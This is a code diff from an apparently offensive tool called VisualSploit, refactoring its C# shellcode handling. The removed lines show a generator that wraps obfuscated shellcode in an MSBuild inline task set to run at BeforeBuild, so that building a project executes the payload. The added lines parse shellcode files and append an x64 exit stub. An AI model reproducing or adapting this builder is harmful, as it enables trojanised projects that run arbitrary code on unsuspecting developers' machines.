@@ -1,32 +1,8 @@
-using VisualSploit.Obfuscation;
+namespace VisualSploit.Core;
 
-namespace VisualSploit;
-
-static class Payload
+internal static class Shellcode
 {
-    public static string Generate(string shellcodePath, ObfuscationConfig config)
-    {
-        var shellcode = ParseShellcode(shellcodePath);
-
-        var payloadCode = ObfuscationEngine.Generate(shellcode, config);
-
-        return $$"""
-            <UsingTask TaskName="InlineCode" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
-              <Task>
-                <Code Type="Fragment" Language="cs">
-                <![CDATA[
-            {{payloadCode}}
-                ]]>
-                </Code>
-              </Task>
-            </UsingTask>
-            <Target Name="BeforeBuild">
-              <InlineCode/>
-            </Target>
-            """;
-    }
-
-    static byte[] ParseShellcode(string path)
+    public static byte[] Parse(string path)
     {
         if (!File.Exists(path))
             throw new FileNotFoundException($"Shellcode file not found: {path}");
@@ -44,10 +20,10 @@ static class Payload
             shellcode = File.ReadAllBytes(path);
         }
 
-        return AppendExitStub(shellcode);
+        return AppendExit(shellcode);
     }
 
-    static byte[] AppendExitStub(byte[] shellcode)
+    static byte[] AppendExit(byte[] shellcode)
     {
         byte[] exitStub = [0x48, 0x83, 0xC4, 0x38, 0xC3];
 
